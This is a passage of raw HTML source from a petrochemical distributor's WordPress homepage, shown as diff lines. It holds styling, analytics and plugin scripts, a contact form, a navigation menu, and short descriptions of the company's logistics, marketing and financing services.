!important;}.has-fl-header-link-border-color{border-color: var(--wp--preset--color--fl-header-link) !important;}.has-fl-header-hover-border-color{border-color: var(--wp--preset--color--fl-header-hover) !important;}.has-fl-nav-bg-border-color{border-color: var(--wp--preset--color--fl-nav-bg) !important;}.has-fl-nav-link-border-color{border-color: var(--wp--preset--color--fl-nav-link) !important;}.has-fl-nav-hover-border-color{border-color: var(--wp--preset--color--fl-nav-hover) !important;}.has-fl-content-bg-border-color{border-color: var(--wp--preset--color--fl-content-bg) !important;}.has-fl-footer-widgets-bg-border-color{border-color: var(--wp--preset--color--fl-footer-widgets-bg) !important;}.has-fl-footer-widgets-text-border-color{border-color: var(--wp--preset--color--fl-footer-widgets-text) !important;}.has-fl-footer-widgets-link-border-color{border-color: var(--wp--preset--color--fl-footer-widgets-link) !important;}.has-fl-footer-widgets-hover-border-color{border-color: var(--wp--preset--color--fl-footer-widgets-hover) !important;}.has-fl-footer-bg-border-color{border-color: var(--wp--preset--color--fl-footer-bg) !important;}.has-fl-footer-text-border-color{border-color: var(--wp--preset--color--fl-footer-text) !important;}.has-fl-footer-link-border-color{border-color: var(--wp--preset--color--fl-footer-link) !important;}.has-fl-footer-hover-border-color{border-color: var(--wp--preset--color--fl-footer-hover) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+<link rel='stylesheet' id='font-awesome-5-css' href='https://www.vinmar.com/wp-content/plugins/bb-plugin/fonts/fontawesome/7.2.0/css/all.min.css?ver=2.11' media='all' />
+<link rel='stylesheet' id='fl-builder-layout-15-css' href='https://www.vinmar.com/wp-content/uploads/bb-plugin/cache/15-layout.css?ver=00ee4692c86bab01e6e12dbeb7e52799' media='all' />
+<link rel='stylesheet' id='jquery-magnificpopup-css' href='https://www.vinmar.com/wp-content/plugins/bb-plugin/css/jquery.magnificpopup.min.css?ver=2.11' media='all' />
+<link rel='stylesheet' id='bootstrap-4-css' href='https://www.vinmar.com/wp-content/themes/bb-theme/css/bootstrap-4.min.css?ver=1.7.19.2' media='all' />
+<link rel='stylesheet' id='fl-automator-skin-css' href='https://www.vinmar.com/wp-content/uploads/bb-theme/skin-6a58f5c22c4f7.css?ver=1.7.19.2' media='all' />
+<link rel='stylesheet' id='fl-child-theme-css' href='https://www.vinmar.com/wp-content/themes/vinm-bbchild/style.css?ver=7.0.2' media='all' />
+<link rel='stylesheet' id='pp-animate-css' href='https://www.vinmar.com/wp-content/plugins/bbpowerpack/assets/css/animate.min.css?ver=3.5.1' media='all' />
+<link rel='stylesheet' id='fl-builder-google-fonts-57e8b7ddfc8d7f8b4ece033abbdf6f6c-css' href='//fonts.googleapis.com/css?family=Montserrat:300,400,700,500,400,700&#038;ver=7.0.2' media='all' />
+<script async data-wp-strategy="async" id="monsterinsights-frontend-script-js" src="https://www.vinmar.com/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend-gtag.min.js?ver=10.2.2"></script>
+<script data-cfasync="false" data-wpfc-render="false" id='monsterinsights-frontend-script-js-extra'>var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/www.vinmar.com","hash_tracking":"false","v4_id":"G-KPNJK0LJ3J"};</script>
+<script id="jquery-core-js" src="https://www.vinmar.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
+<script id="jquery-migrate-js" src="https://www.vinmar.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
+<script id="jquery-cookie-js" src="https://www.vinmar.com/wp-content/plugins/bbpowerpack/assets/js/jquery.cookie.min.js?ver=1.4.1"></script>
+<script id="stickyAnythingLib-js" src="https://www.vinmar.com/wp-content/plugins/sticky-menu-or-anything-on-scroll/assets/js/jq-sticky-anything.min.js?ver=2.1.1"></script>
+<link rel="https://api.w.org/" href="https://www.vinmar.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.vinmar.com/wp-json/wp/v2/pages/15" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.vinmar.com/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 7.0.2" />
+<link rel='shortlink' href='https://www.vinmar.com/' />
+		<script>
+			var bb_powerpack = {
+				version: '2.42.3',
+				getAjaxUrl: function() { return atob( 'aHR0cHM6Ly93d3cudmlubWFyLmNvbS93cC1hZG1pbi9hZG1pbi1hamF4LnBocA==' ); },
+				callback: function() {},
+				mapMarkerData: {},
+				post_id: '15',
+				search_term: '',
+				current_page: 'https://www.vinmar.com/',
+				conditionals: {
+					is_front_page: true,
+					is_home: false,
+					is_archive: false,
+					current_post_type: '',
+					is_tax: false,
+										is_author: false,
+					current_author: false,
+					is_search: false,
+									}
+			};
+					</script>
+		<script>document.documentElement.className += " js";</script>
+<link rel="icon" href="https://www.vinmar.com/wp-content/uploads/Vinmar-site-icon-400x400.webp" sizes="32x32" />
+<link rel="icon" href="https://www.vinmar.com/wp-content/uploads/Vinmar-site-icon-400x400.webp" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://www.vinmar.com/wp-content/uploads/Vinmar-site-icon-400x400.webp" />
+<meta name="msapplication-TileImage" content="https://www.vinmar.com/wp-content/uploads/Vinmar-site-icon-400x400.webp" />
+</head>
+<body class="home wp-singular page-template page-template-tpl-no-header-footer page-template-tpl-no-header-footer-php page page-id-15 wp-theme-bb-theme wp-child-theme-vinm-bbchild fl-builder fl-builder-2-11 fl-theme-1-7-19-2 fl-no-js fl-framework-bootstrap-4 fl-preset-default fl-full-width fl-nav-collapse-menu bb-powerpack-header-footer" itemscope="itemscope" itemtype="https://schema.org/WebPage">
+<a aria-label="Skip to content" class="fl-screen-reader-text" href="#fl-main-content">Skip to content</a><div class="fl-page">
+		<div id="fl-main-content" class="fl-page-content" itemprop="mainContentOfPage" role="main">
+
+		
+<div class="fl-content-full container">
+	<div class="row">
+		<div class="fl-content col-md-12">
+			<article class="fl-post post-15 page type-page status-publish has-post-thumbnail hentry" id="fl-post-15" itemscope="itemscope" itemtype="https://schema.org/CreativeWork">
+
+			<div class="fl-post-content clearfix" itemprop="text">
+		<div class="fl-builder-content fl-builder-content-15 fl-builder-content-primary fl-builder-global-templates-locked" data-post-id="15"><div  class="fl-module fl-module-box fl-node-684dat9cwor2" data-node="684dat9cwor2" aria-label="Box">
+	<figure class="fl-module fl-module-photo fl-photo fl-photo-align-left fl-node-varn7uc64z0o" data-node="varn7uc64z0o" aria-label="Photo" itemscope itemtype="https://schema.org/ImageObject">
+	<div class="fl-photo-content fl-photo-img-webp">
+				<a href="https://www.vinmar.com/" target="_self" itemprop="url">
+					<img decoding="async" class="fl-photo-img wp-image-11460 size-full" src="https://www.vinmar.com/wp-content/uploads/Vinmar-logo-registered-wordmark-white.webp" alt="Vinmar" height="40" width="263" title="Vinmar logo registered-wordmark white" loading="lazy" />
+							</a>
+					</div>
+	</figure>
+<div  class="fl-module fl-module-box fl-node-5nyglrmda27i" data-node="5nyglrmda27i" aria-label="Box">
+	<div  class="fl-module fl-module-box fl-node-ryise9wkz06o" data-node="ryise9wkz06o" aria-label="Box">
+	<figure class="fl-module fl-module-photo fl-photo fl-photo-align-center fl-node-02vskgfbzyta fl-animation fl-fade-in blendmode-overlay" data-node="02vskgfbzyta" data-animation-delay="0.5" data-animation-duration="1" aria-label="Photo" itemscope itemtype="https://schema.org/ImageObject">
+	<div class="fl-photo-content fl-photo-img-webp">
+					<img decoding="async" class="fl-photo-img wp-image-52 size-full" src="https://www.vinmar.com/wp-content/uploads/Angled-half-circle-White-v2.webp" alt="Angled-half-circle-White-v2.webp" height="874" width="1020" title="Angled-half-circle-White-v2.webp" loading="lazy" srcset="https://www.vinmar.com/wp-content/uploads/Angled-half-circle-White-v2.webp 1020w, https://www.vinmar.com/wp-content/uploads/Angled-half-circle-White-v2-800x685.webp 800w, https://www.vinmar.com/wp-content/uploads/Angled-half-circle-White-v2-400x343.webp 400w, https://www.vinmar.com/wp-content/uploads/Angled-half-circle-White-v2-768x658.webp 768w" sizes="auto, (max-width: 1020px) 100vw, 1020px" />
+					</div>
+	</figure>
+<style>.fl-node-02vskgfbzyta.fl-animation:not(.fl-animated){opacity:0}</style><div  class="fl-module fl-module-box fl-node-ay9kftr3wm6u" data-node="ay9kftr3wm6u" aria-label="Box">
+	<h1  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-usb3vpgz4lfw fl-animation fl-fade-up" data-node="usb3vpgz4lfw" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			Your Global Access to Petrochemical Products and Markets	</h1>
+<style>.fl-node-usb3vpgz4lfw.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+	</div>
+	</div>
+<div class="fl-module fl-module-pp-modal-box fl-node-3y8zuv16hdc9" data-node="3y8zuv16hdc9" aria-label="Modal Box">
+	<div class="fl-module-content fl-node-content">
+			<div id="modal-3y8zuv16hdc9" class="pp-modal-wrap has-overlay-animation" role="dialog">
+	<div class="pp-modal-container">
+				<div class="pp-modal layout-standard">
+						<div class="pp-modal-body">
+															<div class="pp-modal-close box-top-right no-modal-header" role="button" tabindex="0" aria-label="Close">
+							<div class="bar-wrap" aria-hidden="true">
+								<span class="bar-1"></span>
+								<span class="bar-2"></span>
+							</div>
+						</div>
+																	<div class="pp-modal-content">
+					<div class="pp-modal-content-inner">
+						<h2 style="margin-bottom: -38px;">Contact Us</h2>
+<p><div class="frm_forms  with_frm_style frm_style_formidable-style" id="frm_form_1_container" >
+<form enctype="multipart/form-data" method="post" class="frm-show-form  frm_ajax_submit  frm_pro_form " id="form_contact-form" >
+<div class="frm_form_fields ">
+<fieldset>
+<legend class="frm_screen_reader">Contact Us</legend>
+
+<div class="frm_fields_container">
+<input type="hidden" name="frm_action" value="create" />
+<input type="hidden" name="form_id" value="1" />
+<input type="hidden" name="frm_hide_fields_1" id="frm_hide_fields_1" value="" />
+<input type="hidden" name="form_key" value="contact-form" />
+<input type="hidden" name="item_meta[0]" value="" />
+<input type="hidden" id="frm_submit_entry_1" name="frm_submit_entry_1" value="2442b47a23" /><input type="hidden" name="_wp_http_referer" value="/" /><div id="frm_field_1_container" class="frm_form_field form-field  frm_required_field frm_left_container">
+	<label for="field_qh4icy" id="field_qh4icy_label" class="frm_primary_label">Name
+		<span class="frm_required" aria-hidden="true">*</span>
+	</label>
+	<input  type="text" id="field_qh4icy" name="item_meta[1]" value=""  data-reqmsg="Name cannot be blank." aria-required="true" data-invmsg="Name is invalid" aria-invalid="false"   />
+	
+	
+</div>
+<div id="frm_field_3_container" class="frm_form_field form-field  frm_required_field frm_left_container">
+	<label for="field_29yf4d" id="field_29yf4d_label" class="frm_primary_label">Email
+		<span class="frm_required" aria-hidden="true">*</span>
+	</label>
+	<input type="email" id="field_29yf4d" name="item_meta[3]" value=""  data-reqmsg="Email cannot be blank." aria-required="true" data-invmsg="Please enter a valid email address" aria-invalid="false"  />
+	
+	
+</div>
+<div id="frm_field_8_container" class="frm_form_field form-field  frm_left_container">
+	<label for="field_iq8s5" id="field_iq8s5_label" class="frm_primary_label">Phone
+		<span class="frm_required" aria-hidden="true"></span>
+	</label>
+	<input type="tel" id="field_iq8s5" name="item_meta[8]" value=""  data-invmsg="Phone is invalid" aria-invalid="false" pattern="((\+\d{1,3}(-|.| )?\(?\d\)?(-| |.)?\d{1,5})|(\(?\d{2,6}\)?))(-|.| )?(\d{3,4})(-|.| )?(\d{4})(( x| ext)\d{1,5}){0,1}$"  />
+	
+	
+</div>
+<div id="frm_field_5_container" class="frm_form_field form-field  frm_required_field frm_left_container">
+	<label for="field_9jv0r1" id="field_9jv0r1_label" class="frm_primary_label">Message
+		<span class="frm_required" aria-hidden="true">*</span>
+	</label>
+	<textarea name="item_meta[5]" id="field_9jv0r1" rows="3"  data-reqmsg="Message cannot be blank." aria-required="true" data-invmsg="Message is invalid" aria-invalid="false"  ></textarea>
+	
+	
+</div>
+<div id="frm_field_31_container" class="frm_form_field form-field  frm_none_container">
+	<label for="g-recaptcha-response" id="field_gg5m0_label" class="frm_primary_label">Captcha
+		<span class="frm_required" aria-hidden="true"></span>
+	</label>
+	<div  id="field_gg5m0" class="frm-g-recaptcha" data-sitekey="6Lf7OdgdAAAAAEqSBy1VnUrOPVsNHUzmEaqi7_cL" data-size="normal" data-theme="light"></div>
+	
+	
+</div>
+<div id="frm_field_6_container" class="frm_form_field form-field ">
+	<div class="frm_submit frm_flex">
+<button class="frm_button_submit frm_final_submit" type="submit"   formnovalidate="formnovalidate">SUBMIT</button>
+
+
+
+</div>
+</div>
+	<input type="hidden" name="item_key" value="" />
+			<div id="frm_field_32_container">
+			<label for="field_xw9cx" >
+				If you are human, leave this field blank.			</label>
+			<input  id="field_xw9cx" type="text" class="frm_form_field form-field frm_verify" name="item_meta[32]" value=""  />
+		</div>
+		<input name="frm_state" type="hidden" value="aKxVl7bLBcKly5d6Rw843hJW3Kk8H/+U42zrduiPu9UaFPs/zlLez2i6KC1ZdqxU" /></div>
+</fieldset>
+</div>
+
+</form>
+</div>
+</p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="pp-modal-overlay"></div>
+</div>
+	</div>
+</div>
+	</div>
+<div id="sticky-menu" class="fl-row fl-row-full-width fl-row-bg-none fl-node-hyriocxt1e8w fl-row-default-height fl-row-align-center" data-node="hyriocxt1e8w">
+	<div class="fl-row-content-wrap">
+						<div class="fl-row-content fl-row-fixed-width fl-node-content">
+		
+<div class="fl-col-group fl-node-lj708paq1v5c" data-node="lj708paq1v5c">
+			<div class="fl-col fl-node-vuyrozxbp98n fl-col-bg-none nav-column-container" data-node="vuyrozxbp98n">
+	<div class="fl-col-content fl-node-content"><div class="fl-module fl-module-pp-advanced-menu fl-node-t539scyxl8u7" data-node="t539scyxl8u7" aria-label="Advanced Menu">
+	<div class="fl-module-content fl-node-content">
+					<div class="pp-advanced-menu-mobile">
+			<button class="pp-advanced-menu-mobile-toggle hamburger" tabindex="0" aria-label="Menu" aria-expanded="false">
+				<div class="pp-hamburger"><div class="pp-hamburger-box"><div class="pp-hamburger-inner"></div></div></div>			</button>
+			</div>
+			<div class="pp-advanced-menu pp-advanced-menu-accordion-collapse pp-menu-default pp-menu-align-left pp-menu-position-below">
+   	   	<div class="pp-clear"></div>
+	<nav class="pp-menu-nav" aria-label="Menu" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement">
+		<ul id="menu-header-main-menu" class="menu pp-advanced-menu-horizontal pp-toggle-arrows"><li id="menu-item-34" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home"><a href="https://www.vinmar.com/#services" aria-current="page"><span class="menu-item-text">Services</span></a></li><li id="menu-item-35" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home"><a href="https://www.vinmar.com/#products" aria-current="page"><span class="menu-item-text">Products</span></a></li><li id="menu-item-163" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-has-children pp-has-submenu"><div class="pp-has-submenu-container"><a href="https://www.vinmar.com/#about-us" aria-current="page"><span class="menu-item-text">About</span></a><button type="button" class="pp-menu-toggle" aria-label="Toggle submenu for About" aria-haspopup="true" aria-expanded="false" aria-controls="sub-menu-163"></button></div><ul id="sub-menu-163" class="sub-menu">	<li id="menu-item-11335" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/compliance/"><span class="menu-item-text">Compliance</span></a></li>	<li id="menu-item-165" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/terms-and-conditions/"><span class="menu-item-text">Terms and Conditions</span></a></li>	<li id="menu-item-11337" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/affiliated-companies/"><span class="menu-item-text">Affiliated Companies</span></a></li></ul></li><li id="menu-item-164" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home"><a href="https://www.vinmar.com/#global-presence" aria-current="page"><span class="menu-item-text">Global Presence</span></a></li><li id="menu-item-11386" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/news/"><span class="menu-item-text">News</span></a></li><li id="menu-item-11344" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/careers/"><span class="menu-item-text">Careers</span></a></li><li id="menu-item-36" class="modal-contact nav-item-rightalign menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home"><a href="https://www.vinmar.com/#contact" aria-current="page"><span class="menu-item-text">Contact Us</span></a></li></ul>	</nav>
+</div>
+<script type="text/html" id="pp-menu-t539scyxl8u7"><div class="pp-advanced-menu pp-advanced-menu-accordion-collapse full-screen pp-menu-position-below">
+	<div class="pp-clear"></div>
+	<nav class="pp-menu-nav pp-menu-overlay pp-overlay-slide-down" aria-label="Menu" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement">
+		<div class="pp-menu-close-btn"></div>
+		<ul id="menu-header-main-menu-1" class="menu pp-advanced-menu-horizontal pp-toggle-arrows"><li id="menu-item-34" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home"><a href="https://www.vinmar.com/#services" aria-current="page"><span class="menu-item-text">Services</span></a></li><li id="menu-item-35" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home"><a href="https://www.vinmar.com/#products" aria-current="page"><span class="menu-item-text">Products</span></a></li><li id="menu-item-163" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-has-children pp-has-submenu"><div class="pp-has-submenu-container"><a href="https://www.vinmar.com/#about-us" aria-current="page"><span class="menu-item-text">About</span></a><button type="button" class="pp-menu-toggle" aria-label="Toggle submenu for About" aria-haspopup="true" aria-expanded="false" aria-controls="sub-menu-163"></button></div><ul id="sub-menu-163" class="sub-menu">	<li id="menu-item-11335" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/compliance/"><span class="menu-item-text">Compliance</span></a></li>	<li id="menu-item-165" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/terms-and-conditions/"><span class="menu-item-text">Terms and Conditions</span></a></li>	<li id="menu-item-11337" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/affiliated-companies/"><span class="menu-item-text">Affiliated Companies</span></a></li></ul></li><li id="menu-item-164" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home"><a href="https://www.vinmar.com/#global-presence" aria-current="page"><span class="menu-item-text">Global Presence</span></a></li><li id="menu-item-11386" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/news/"><span class="menu-item-text">News</span></a></li><li id="menu-item-11344" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.vinmar.com/careers/"><span class="menu-item-text">Careers</span></a></li><li id="menu-item-36" class="modal-contact nav-item-rightalign menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home"><a href="https://www.vinmar.com/#contact" aria-current="page"><span class="menu-item-text">Contact Us</span></a></li></ul>	</nav>
+</div>
+</script>	</div>
+</div>
+</div>
+</div>
+	</div>
+		</div>
+	</div>
+</div>
+<div id="services" class="fl-row fl-row-full-width fl-row-bg-none fl-node-a2l3dmpkqxye fl-row-default-height fl-row-align-center" data-node="a2l3dmpkqxye">
+	<div class="fl-row-content-wrap">
+						<div class="fl-row-content fl-row-fixed-width fl-node-content">
+		
+<div class="fl-col-group fl-node-1mqzwo4jgyvc" data-node="1mqzwo4jgyvc">
+			<div class="fl-col fl-node-0reko8pxgmyh fl-col-bg-color" data-node="0reko8pxgmyh">
+	<div class="fl-col-content fl-node-content"><h2  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-am259bywj8eo fl-animation fl-fade-up" data-node="am259bywj8eo" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			Services	</h2>
+<style>.fl-node-am259bywj8eo.fl-animation:not(.fl-animated){opacity:0}</style><div  class="fl-module fl-module-box fl-node-86tv3e759rwl" data-node="86tv3e759rwl" aria-label="Box">
+	<h2  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-wucr8ftyqi7l fl-animation fl-fade-up" data-node="wucr8ftyqi7l" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			Logistics	</h2>
+<style>.fl-node-wucr8ftyqi7l.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+<div  class="fl-module fl-module-box fl-node-0rmx6ly9av8p" data-node="0rmx6ly9av8p" aria-label="Box">
+	<div  class="fl-module fl-module-box fl-node-63jzmkhq0lo8" data-node="63jzmkhq0lo8" aria-label="Box">
+	<div  class="fl-module fl-module-rich-text fl-rich-text fl-node-29uqt05d3k4p fl-animation fl-fade-up" data-node="29uqt05d3k4p" data-animation-delay="0" data-animation-duration="1" aria-label="Text Editor">
+	<p>Vinmar partners with the world’s leading petrochemical producers to understand their strategic priorities and deliver value through execution grounded in passion, integrity, compliance, respect, and trust. Supported by our worldwide footprint and strong local presence, we steward their brands with dependability and excellence in every region we serve.</p>
+</div>
+<style>.fl-node-29uqt05d3k4p.fl-animation:not(.fl-animated){opacity:0}</style><div  class="fl-module fl-module-box fl-node-uv4yqlztbgd6" data-node="uv4yqlztbgd6" aria-label="Box">
+	<div  class="fl-module fl-module-rich-text fl-rich-text fl-node-xfy6zmv3pdj7" data-node="xfy6zmv3pdj7" aria-label="Text Editor">
+	<p><strong>Download Compliance Materials</strong></p>
+<ul>
+<li><a href="https://www.vinmar.com/wp-content/uploads/Prohibited-Restricted-Countries-Vinmar.pdf" target="_blank" rel="noopener">Prohibited &amp; Restricted Countries</a></li>
+</ul>
+</div>
+	</div>
+	</div>
+	</div>
+</div>
+</div>
+	</div>
+		</div>
+	</div>
+</div>
+<div class="fl-row fl-row-full-width fl-row-bg-none fl-node-f1eqpwutkg7d fl-row-custom-height fl-row-align-center" data-node="f1eqpwutkg7d">
+	<div class="fl-row-content-wrap">
+						<div class="fl-row-content fl-row-fixed-width fl-node-content">
+		
+<div class="fl-col-group fl-node-tkb7omlf4wrn" data-node="tkb7omlf4wrn">
+			<div class="fl-col fl-node-rju8wy6mtkif fl-col-bg-color" data-node="rju8wy6mtkif">
+	<div class="fl-col-content fl-node-content"><div  class="fl-module fl-module-box fl-node-8jwbuqexlgty" data-node="8jwbuqexlgty" aria-label="Box">
+	<figure class="fl-module fl-module-photo fl-photo fl-photo-align-right fl-node-5kj3zurcqh6w fl-animation fl-fade-in" data-node="5kj3zurcqh6w" data-animation-delay="0" data-animation-duration="1" aria-label="Photo" itemscope itemtype="https://schema.org/ImageObject">
+	<div class="fl-photo-content fl-photo-img-webp">
+					<img decoding="async" class="fl-photo-img wp-image-11347 size-full" src="https://www.vinmar.com/wp-content/uploads/pmv-chamara-rZtt0QoNRP4-unsplash-half-circle-overlay.webp" alt="pmv-chamara-rZtt0QoNRP4-unsplash-half circle overlay" height="879" width="879" title="pmv-chamara-rZtt0QoNRP4-unsplash-half circle overlay" loading="lazy" srcset="https://www.vinmar.com/wp-content/uploads/pmv-chamara-rZtt0QoNRP4-unsplash-half-circle-overlay.webp 879w, https://www.vinmar.com/wp-content/uploads/pmv-chamara-rZtt0QoNRP4-unsplash-half-circle-overlay-800x800.webp 800w, https://www.vinmar.com/wp-content/uploads/pmv-chamara-rZtt0QoNRP4-unsplash-half-circle-overlay-400x400.webp 400w, https://www.vinmar.com/wp-content/uploads/pmv-chamara-rZtt0QoNRP4-unsplash-half-circle-overlay-768x768.webp 768w" sizes="auto, (max-width: 879px) 100vw, 879px" />
+					</div>
+	</figure>
+<style>.fl-node-5kj3zurcqh6w.fl-animation:not(.fl-animated){opacity:0}</style><div  class="fl-module fl-module-box fl-node-5gt0l489rnju" data-node="5gt0l489rnju" aria-label="Box">
+	<div  class="fl-module fl-module-box fl-node-ktj8ga5q1fsz" data-node="ktj8ga5q1fsz" aria-label="Box">
+	<h3  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-crs5fjp321ek fl-animation fl-fade-up" data-node="crs5fjp321ek" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			Marketing & Distribution	</h3>
+<style>.fl-node-crs5fjp321ek.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+<div  class="fl-module fl-module-box fl-node-lwoqcvhgty0a" data-node="lwoqcvhgty0a" aria-label="Box">
+	<div  class="fl-module fl-module-rich-text fl-rich-text fl-node-tljuafge7mqd fl-animation fl-fade-up" data-node="tljuafge7mqd" data-animation-delay="0" data-animation-duration="1" aria-label="Text Editor">
+	<p>Vinmar markets products from the world's leading petrochemical producers and facilitates their participation in the global marketplace. Vinmar works to understand our petrochemical suppliers' objectives and develops specific marketing plans accordingly. Our global reach through local presence ensures appropriate market stewardship.</p>
+</div>
+<style>.fl-node-tljuafge7mqd.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+	</div>
+	</div>
+</div>
+</div>
+	</div>
+		</div>
+	</div>
+</div>
+<div class="fl-row fl-row-full-width fl-row-bg-none fl-node-l14d98ytgqr6 fl-row-default-height fl-row-align-center" data-node="l14d98ytgqr6">
+	<div class="fl-row-content-wrap">
+						<div class="fl-row-content fl-row-fixed-width fl-node-content">
+		
+<div class="fl-col-group fl-node-ywkse1hpqt0z" data-node="ywkse1hpqt0z">
+			<div class="fl-col fl-node-v9a5z4purmw8 fl-col-bg-color" data-node="v9a5z4purmw8">
+	<div class="fl-col-content fl-node-content"><div  class="fl-module fl-module-box fl-node-pbljvaws61o4" data-node="pbljvaws61o4" aria-label="Box">
+	<h2  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-sa2rxvflcjek fl-animation fl-fade-up" data-node="sa2rxvflcjek" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			Financing	</h2>
+<style>.fl-node-sa2rxvflcjek.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+<div  class="fl-module fl-module-box fl-node-4v2107lnaye5" data-node="4v2107lnaye5" aria-label="Box">
+	<div  class="fl-module fl-module-rich-text fl-rich-text fl-node-10pv6fyqm7c3 fl-animation fl-fade-up" data-node="10pv6fyqm7c3" data-animation-delay="0" data-animation-duration="1" aria-label="Text Editor">
+	<p>Vinmar’s strong financial foundation and decades of experience enable effective management of country, credit, and currency risks, allowing the company to offer competitive and flexible financial terms to both petrochemical producers and users.</p>
+</div>
+<style>.fl-node-10pv6fyqm7c3.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+</div>
+</div>
+	</div>
+		</div>
+	</div>
+</div>
+<div id="products" class="fl-row fl-row-full-width fl-row-bg-none fl-node-ycum97qprkbd fl-row-default-height fl-row-align-center" data-node="ycum97qprkbd">
+	<div class="fl-row-content-wrap">
+						<div class="fl-row-content fl-row-fixed-width fl-node-content">
+		
+<div class="fl-col-group fl-node-5rge3wt9u1sj" data-node="5rge3wt9u1sj">
+			<div class="fl-col fl-node-iz3td8vlfbo2 fl-col-bg-color" data-node="iz3td8vlfbo2">
+	<div class="fl-col-content fl-node-content"><h2  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-hejpqw1grmt2 fl-animation fl-fade-up" data-node="hejpqw1grmt2" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			Products	</h2>
+<style>.fl-node-hejpqw1grmt2.fl-animation:not(.fl-animated){opacity:0}</style><div  class="fl-module fl-module-box fl-node-mkw8vhqrsojf overflow-hidden" data-node="mkw8vhqrsojf" aria-label="Box">
+	<div  class="fl-module fl-module-box fl-node-wm67k04lrnvq" data-node="wm67k04lrnvq" aria-label="Box">
+	<div  class="fl-module fl-module-html fl-html fl-node-hc50em4lb8wz blendmode-multiply" data-node="hc50em4lb8wz" aria-label="HTML">
